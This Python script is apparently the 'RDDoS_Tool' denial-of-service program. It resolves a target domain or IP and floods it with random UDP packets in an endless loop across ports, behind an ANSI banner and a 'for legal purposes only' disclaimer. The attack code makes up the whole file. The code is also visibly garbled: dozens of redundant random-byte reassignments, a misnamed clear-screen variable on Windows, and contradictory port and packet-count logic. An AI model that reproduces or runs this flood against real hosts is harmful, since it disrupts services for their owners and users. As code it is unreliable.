"""
Copyright (c) 2020-2021 Vladimir Rogozin (vladimir20040609@gmail.com)

Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
or copy at http://opensource.org/licenses/MIT)
"""

# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "1.2"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1)
bytes = random._urandom(100176)
bytes = random._urandom(150176)
bytes = random._urandom(250176)
bytes = random._urandom(350176)
bytes = random._urandom(450176)
bytes = random._urandom(550176)
bytes = random._urandom(650176)
bytes = random._urandom(750176)
bytes = random._urandom(850176)
bytes = random._urandom(950176)
bytes = random._urandom(1250176)
bytes = random._urandom(1450176)
bytes = random._urandom(1550176)
bytes = random._urandom(2550176)
bytes = random._urandom(3550176)
bytes = random._urandom(4550176)
bytes = random._urandom(5550176)
bytes = random._urandom(6550176)
bytes = random._urandom(7550176)
bytes = random._urandom(8550176)
bytes = random._urandom(9550176)
bytes = random._urandom(10550176)
bytes = random._urandom(12550176)
bytes = random._urandom(14550176)
bytes = random._urandom(15550176)
bytes = random._urandom(25550176)
bytes = random._urandom(35550176)
bytes = random._urandom(45550176)
bytes = random._urandom(55550176)
bytes = random._urandom(65550176)
bytes = random._urandom(65550176)
bytes = random._urandom(0)
bytes = random._urandom(1)
bytes = random._urandom(2)
bytes = random._urandom(3)
bytes = random._urandom(4)
bytes = random._urandom(5)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(1)
bytes = random._urandom(2)
bytes = random._urandom(3)
bytes = random._urandom(4)
bytes = random._urandom(5)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(2)
bytes = random._urandom(3)
bytes = random._urandom(4)
bytes = random._urandom(5)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(3)
bytes = random._urandom(4)
bytes = random._urandom(5)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(4)
bytes = random._urandom(5)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(5)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(6)
bytes = random._urandom(7)
bytes= random._urandom(8)
bytes= random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(7)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(8)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(9)
bytes = random._urandom(10)
bytes = random._urandom(10)
bytes = random._urandom(9)
bytes = random._urandom(8)
bytes = random._urandom(7)
bytes = random._urandom(6)
bytes = random._urandom(5)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(9)
bytes = random._urandom(8)
bytes = random._urandom(7)
bytes = random._urandom(6)
bytes = random._urandom(5)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(8)
bytes = random._urandom(7)
bytes = random._urandom(6)
bytes = random._urandom(5)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(7)
bytes = random._urandom(6)
bytes = random._urandom(5)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(6)
bytes = random._urandom(5)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(5)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(4)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(3)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(2)
bytes = random._urandom(1)
bytes = random._urandom(0)
bytes = random._urandom(1)
bytes = random._urandom(0)

# RDDoS_Tool
while True:
    # UI.
    print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)       
    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
    print("                        Author: Mr.\033[91mRed\033[0m")
    print("       Github: https://github.com/Red-company/RDDoS_Tool")
    print('                   For legal purposes only')
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

    elif opt == '3':
        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
        print("\033[101mOpen.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
        print("\033[101mSecure.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
        print("RedDDoS Tool is an open source tool for              \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
        print("penetration. You can test networks/servers/any        \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
        print("other devices with it.                                 \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
        print("                                                         \033[92m'-._____.-'\033[0m")
        print("Author of the program is not responsible for")
        print("it's usage, everybody MUST use it ONLY in         member-id: 'rst-00000002'")
        print("legit cases.")
        print("\nFor more information visit project's site.")
        
        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = True # If 'False' all ports will be use, if 'True' - certain.
port = 1

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

while 1:
    sent_bool = str(input("Are You Ready to Send a Packet? [y/n]: "))

    if (sent_bool == "y") or (port_bool == "Y"):
        sent_mode = True
        sent = int(input("Sent Attack Packet: "))
        break

    elif (sent_bool == "n") or (sent_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == True:  # All ports.
    try:
        while True:
            if port == 9999999999999999:
                port = 1

            elif port == 999999999999999999:
                port = 1

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

if sent_mode == True:  # All ports.
    try:
        while True:
            if sent == 9999999999999999:
                sent = 1

            elif sent == 999999999999999999:
                sent = 1

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

if sent_bool == True:  # All ports.
    try:
        while True:
            if sent == 9999999999999999:
                sent = 1

            elif sent == 999999999999999999:
                sent = 1

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 9999999999999999:
        port = 1
        
    elif port == 99999999999999999:
        port = 1

    elif port == 9999999999999999999:
        port = 1

elif sent_mode == True: # Certain port.
    if sent < 99999999999999999999:
        sent = 1
        
    elif sent == 99999999999999999999:
        sent = 1

    elif sent == 9999999999999999999999:
        sent = 1

elif sent_bool == True: # Certain port.
    if sent < 99999999999999999999:
        sent = 1
        
    elif sent == 99999999999999999999:
        sent = 1

    elif sent == 9999999999999999999999:
        sent = 1

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
